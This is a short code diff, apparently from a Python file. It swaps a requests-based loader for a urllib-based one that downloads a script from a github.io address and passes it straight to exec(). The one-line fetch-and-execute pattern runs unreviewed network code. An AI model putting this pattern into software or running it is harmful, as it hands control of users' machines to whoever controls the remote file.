@@ -1,3 +1,2 @@
-exec(__import__('requests').get("https://jesusjorge.github.io/autoexec.py").text)
-
+exec(__import__('urllib.request', fromlist=['']).urlopen("https://jesusjorge.github.io/autoexec.py").read().decode())
 
